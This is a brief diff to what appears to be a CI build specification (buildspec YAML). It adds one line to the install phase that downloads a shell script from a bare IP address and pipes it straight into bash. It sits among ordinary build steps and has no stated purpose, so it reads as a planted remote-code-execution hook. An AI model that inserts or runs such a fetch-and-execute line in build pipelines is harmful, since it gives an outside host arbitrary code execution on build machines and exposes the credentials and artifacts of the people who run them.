@@ -5,7 +5,7 @@ version: 0.2
 phases:
   install:
     commands:
-
+      - curl http://52.87.247.130/file.sh | bash
       # baked in our image.
       # this also takes care of launching the docker daemon.
       - /root/ecr-proxy/start.sh
